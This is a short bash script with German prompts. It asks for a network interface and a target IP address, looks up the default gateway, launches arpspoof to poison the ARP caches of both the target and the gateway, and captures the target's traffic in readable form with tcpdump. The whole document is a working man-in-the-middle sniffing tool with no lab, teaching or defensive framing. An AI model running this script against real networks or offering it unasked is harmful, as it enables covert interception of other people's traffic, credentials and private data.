#!/bin/bash

set -ex

read -p "Wie heisst die Schnittstelle? [enp30s0\eth0] : " modul
read -p "Wie heisst die IP? : " ip

gateway=$(route -n|grep ^0.0.0.0|cut -d' ' -f 10)

arpspoof -i $modul -t $ip -r $gateway &

tcpdump -i $modul -A host $ip
